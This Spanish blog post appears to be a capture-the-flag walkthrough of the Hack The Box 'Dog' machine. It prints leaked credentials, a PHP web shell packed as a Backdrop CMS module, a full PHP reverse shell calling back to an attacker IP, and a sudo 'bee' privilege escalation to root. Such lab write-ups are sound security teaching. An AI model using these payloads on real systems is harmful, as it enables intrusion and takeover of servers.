---
layout: post
title:  "Writeup Dog"
date:   2025-07-12
categories: post
---

<img src="/images/writeup-dog/Pasted image 20250508092857.png">

***Dificultad: Facil***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
hola! hoy vamos a atacar una nueva maquina, esta ves vamos al lidiar con un perrillo que ha dejado informacion relevante en un archivo .git y que nos permitira ir a por una vulnerabilidad de carga de modulos maliciosos para la ejecucion remota de comandos, 


<h3>Reconocimiento:</h3>
en mi directorio de trabajo de nmap, hare el primer escaneo de reconocimiento a la ip:
```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000  10.10.10.10 -oN puertos
```

tenemos 2 puertos abiertos:
```
Scanned at 2025-05-08 10:34:14 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
```

vamos a capturar banners y a lanzar scripts de reconocimiento a los puertos abiertos:
```bash
nmap -p22,80 -sCV -n -vvv 10.10.10.10 -oN objetivos
```

nos ha dado mucha información:
```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<h3>Enumeracion</h3>

tenemos un robots.txt el cual nos muestra las rutas desactivadas pero, nos dice que hay un repositorio /.git/ 

antes de avanzar mas con este, voy a mirar la pagina:
<img src="/images/writeup-dog/Pasted image 20250508105526.png">
haha! tenemos un perro rechoncho :D

wappalyzer nos muestra el cms:

<img src="/images/writeup-dog/Pasted image 20250508105658.png">

evidentemente no tenemos acceso a las rutas mencionadas en el robots.txt porque estan desactivadas:

<img src="/images/writeup-dog/Pasted image 20250508105941.png">

tenemos un panel de inicio de sesión:
<img src="/images/writeup-dog/Pasted image 20250508110137.png">

con un apartado para resetear contraseña

antes de empezar a enumerar aqui, quiero pasar a ver el .git, dado que no se menciona en el robots

<img src="/images/writeup-dog/Pasted image 20250508110419.png">

oh! tenemos directory listing

mirando desde el navegador, no tenemos mucho acceso a datos, hay objetos pero al intentar acceder a ellos estos se descargan de este modo:
<img src="/images/writeup-dog/Pasted image 20250508111255.png">

sabemos que los directorios git pueden tener credenciales y datos interesantes, además de que este quería estar "oculto" por lo que quiero ver el contenido del mismo, esto nos podria dar pistas sobre ese panel o enpoints o credenciales validas

vamos a dumpear el directorio .git entero a nuestra maquina, hay una herramienta llamada git-dumper para estas ocasiones:

vamos a instalar nuestro entorno de desarrollo python antes:
```bash
python3 -m venv 3vilsec
source 3vilsec/bin/activate
```

```bash
git clone clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip install -r requirements.txt
```

ahora, para dumpear todo:
```
python3 git_dumper.py http://10.10.10.10/.git ~/htb/dog/content/git
```

veremos que son mas de 2800 archivos D: manualmente hubiera terminado en 1 año

ya dentro todo, mire algunos archivos interesantes, ademas de aplicar filtros de busqueda con grep.

el primero archivo que lamo mi atención fue settings.php dentro de la misma carpeta .git
```bash

cat settings.php

 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

esto son credenciales de una base de datos:
root:BackDropJ2024DS2024

ahora, para buscar usuarios que se estén mencionando el algún archivo, hice lo que es típico en estos escenarios, los usuarios tienden a tener el nombre de la maquina adjunto, además de que mirando algunos documentos había observado dog@dog.htb así que decidí usar grep para buscar mas resultados:
```bash
 grep -E -r -i "@dog.htb"                       
```
tenemos:
```
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000    commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000       commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

dog@dog.htb - tiffany@dog.htb

podría intentar estos usuarios y credenciales en el panel de la pagina

al intentar tiffany@dog.htb:BackDropJ2024DS2024 tenemos:
<img src="/images/writeup-dog/Pasted image 20250509111747.png">

un panel de administración

enumerando el panel, tenemos la opción de subir nuevas paginas o administrar contenido de lo que ya existe:
http://10.129.233.186/?q=admin/content

tenemos tambien un listado de cuentas de usuario:
http://10.129.233.186/?q=admin/people

tambien podemos instalar nuevos temas:
http://10.129.233.186/?q=admin/appearance

tenemos un apartado para instalar módulos en la pagina:
http://10.129.233.186/?q=admin/modules

y algunos mas que no nos llevaran a nada:
<img src="/images/writeup-dog/Pasted image 20250509114140.png">

hay mucho contenido y podemos intentar varias cosas para ejecutar comando, cargar imágenes maliciosas, paginas para una webshell, etc pero buscando alguna vulnerabilidad para este cms en particular, encontré en exploit-db:
<img src="/images/writeup-dog/Pasted image 20250509114403.png">

la vulnerabilidad es del 2024, además de que la contraseña hace mención a este año, pero si queremos confirmar, en los archivos git podemos buscar referencias a la version:
```bash
grep -E -r -i "backdrop 1.2"
```

tenemos:
```
core/modules/simpletest/tests/common.test:   * Since Backdrop 1.27.0, the "browsers" option for backdrop_add_js() and
core/modules/entity/entity.module: * Prior to Backdrop 1.2.0, this function was actually used to load multiple
```

es vulnerable!

pero esta la opción de hacerlo desde los archivos del servidor o de manera manual desde nuestro equipo en la ruta http://10.10.10.10/?q=admin/installer/manual :
<img src="/images/writeup-dog/Pasted image 20250509112642.png">


aunque nos permite solo subir archivos tipo *tar tgz gz bz2* podemos incluir una carga maliciosa dentro de un archivo .tar

en el exploit, vemos que necesitamos 2 archivos:

vil.php
```bash
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
```
 que lo que hace es crear un bloque en la pagina con el cual podremos ejecutar comandos

y un archivo .info:
```bash
    type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
```

despues de algunos intentos, al momento de cargar el modulo:

<img src="/images/writeup-dog/Pasted image 20250509132149.png">

el archivo debe tener doble extensión 

```bash
tar -cvfz vil.tar.gz vil
```

si cargamos el archivo:
<img src="/images/writeup-dog/Pasted image 20250509132100.png">


en la pagina principal no hay ningún bloque de código y visitando la url que se menciona en el exploit tampoco se ve nada, ni en el buscador de modulos, entonces parece que es algún script que al detectar el cambio, elimina el modulo malicioso? podemos intentar cargar una reverse shell directamente y ver si funciona? en lugar de una webshell

voy a cambiar mi vil.php a:
```php
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php


set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.193';
$port = 4443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
    </pre>
    </body>
    </html>

```
usando una rev shell de revshells.com en la parte donde va el php

teniendo nc en escucha:
```bash
nc -lnvp 4443
```

y cargando el modulo en */modules/vil/vil.php* antes de que se elimine desde otra pestana:
<img src="/images/writeup-dog/Pasted image 20250509163646.png">

aunque nos dice not found, vemos que se ha ejecutado la reverse shell

<img src="/images/writeup-dog/Pasted image 20250509163735.png">

en el directorio /home, vemos 2 usuarios, a los cuales no tenemos acceso:
```bash
$ cd /home
$ ls
jobert
johncusack
$ 
```

<h3>Movimiento lateral</h3>

probando las credenciales que ya teníamos en ambos usuarios, estas sirven para el usuario johncusack:
```bash
$ su johncusack
Password: BackDropJ2024DS2024
whoami
johncusack
```

aquí tendremos la flag de usuario y además podemos conectarnos por ssh para una shell mas estable
<img src="/images/writeup-dog/Pasted image 20250509165025.png">

<h3>Escalada de privilegios</h3>

enumerando un poco los permisos del usuario, veo que podemos correr una aplicación llamada **bee**

mirando el codigo fuente, vemos que esta relacionada con backdrop y podemos ver el proyecto en github:
https://github.com/backdrop-contrib/bee/blob/1.x-1.x/bee.php

<img src="/images/writeup-dog/Pasted image 20250509170508.png">

si ejecutamos el binario, vemos al final del todo:
<img src="/images/writeup-dog/Pasted image 20250509170800.png">

podemos ejecutar scripts arbitrarios de php? podria intentar cambiar la /bin/bash a suid o mandarnos una rev shell como root:

al intentar correr ya sea un comando o un script me da el siguiente error:
<img src="/images/writeup-dog/Pasted image 20250509173507.png">

si buscamos, al parecer el error se da porque el script no se ejecuta en el entorno esperado, asi que voy al directorio del backdrop /var/www/html

y pruebo el comando:
```bash
sudo /usr/local/bin/bee eval "phpinfo();"
```

y funciona!

asi que, lo que hice fue crear un script en /tmp que si se ejecuta nos dara una bash como root:
```bash
 echo '<?php system("/bin/bash -i"); ?>' > /tmp/3vil.php
```

y luego:
```bash
sudo /usr/local/bin/bee php-script '/tmp/3vil.php'
```

somos root:
<img src="/images/writeup-dog/Pasted image 20250509174435.png">

------------------------
\
nos vemos en la siguiente maquina! 

<h3>H4ck th3 W0rld</h3>

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;">